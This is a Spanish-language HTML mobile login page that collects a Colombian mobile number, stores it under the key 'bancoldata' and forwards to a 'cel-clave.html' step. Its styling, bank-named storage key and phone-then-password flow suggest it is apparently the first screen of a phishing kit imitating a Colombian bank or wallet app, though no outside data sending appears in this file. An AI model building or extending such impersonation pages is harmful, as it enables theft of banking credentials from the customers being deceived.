<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ingreso</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#21003d;
  display:flex;
  justify-content:center;
}

/* CONTENEDOR APP */
.container{
  width:100%;
  max-width:420px;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  padding:20px;
  color:white;
  animation:fadeIn .5s ease;
}

/* HEADER */
header{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.circle{
  width:22px;
  height:22px;
  border:2px solid white;
  border-radius:50%;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:14px;
}

/* FORM */
.form-box{
  margin-top:auto;
}

.input-box{
  display:flex;
  background:rgba(255,255,255,0.15);
  border-radius:6px;
  overflow:hidden;
  transition:.3s;
}

.input-box:focus-within{
  background:rgba(255,255,255,0.25);
}

.prefix{
  padding:12px;
  border-right:2px solid #21003d;
  color:#ff4fc3;
  font-weight:bold;
}

input{
  flex:1;
  padding:12px;
  border:none;
  background:transparent;
  color:white;
  font-size:18px;
  outline:none;
}

input::placeholder{
  color:#ddd;
}

/* BOTON */
button{
  width:100%;
  margin-top:12px;
  padding:14px;
  border:none;
  border-radius:6px;
  background:#ff008c;
  color:white;
  font-size:16px;
  cursor:pointer;
  transition:.3s;
}

button:disabled{
  opacity:0.4;
}

button:active{
  transform:scale(0.96);
}

/* LOADER */
.loader{
  position:fixed;
  inset:0;
  background:#21003d;
  display:flex;
  justify-content:center;
  align-items:center;
  opacity:0;
  pointer-events:none;
  transition:.4s;
}

.loader.active{
  opacity:1;
  pointer-events:all;
}

.spinner{
  width:40px;
  height:40px;
  border:4px solid rgba(255,255,255,0.2);
  border-top:4px solid #ff008c;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

/* ANIMACIONES */
@keyframes fadeIn{
  from{opacity:0; transform:translateY(10px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>

<body>

<div class="container">

<header>
  <div class="circle">?</div>

  <!-- LOGO -->
  <div style="color:#aaa;">
    <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
      <g>
        <path d="M83.59,23.13..."></path>
      </g>
    </svg>
  </div>
</header>

<div class="form-box">

<div class="input-box">
  <div class="prefix">+57</div>
  <input 
    type="tel" 
    id="phone" 
    inputmode="numeric"
    placeholder="Ingresa tu cel"
    maxlength="12">
</div>

<button id="btn" disabled>Continuar</button>

</div>

</div>

<!-- LOADER -->
<div class="loader" id="loader">
  <div class="spinner"></div>
</div>

<script>
const phone = document.getElementById("phone");
const btn = document.getElementById("btn");
const loader = document.getElementById("loader");

/* FORMATO */
function formatNumber(value){
  let digits = value.replace(/\D/g,"");

  if(digits.length > 10) digits = digits.slice(0,10);

  if(digits.length > 6){
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  }else if(digits.length > 3){
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

/* VALIDACION */
function validate(){
  const digits = phone.value.replace(/\D/g,"");
  return digits.length === 10 && digits.startsWith("3");
}

/* INPUT */
phone.addEventListener("input", ()=>{
  phone.value = formatNumber(phone.value);
  btn.disabled = !validate();
});

/* CLICK */
btn.addEventListener("click", ()=>{
  if(!validate()) return;

  /* vibración móvil */
  if(navigator.vibrate) navigator.vibrate(50);

  /* guardar */
  const raw = phone.value.replace(/\D/g,"");

  localStorage.setItem("bancoldata", JSON.stringify({
    telefono: raw,
    fecha: new Date().toISOString()
  }));

  /* mostrar loader */
  loader.classList.add("active");

  /* transición tipo app */
  setTimeout(()=>{
    window.location.href = "cel-clave.html";
  },1200);
});
</script>

</body>
</html>
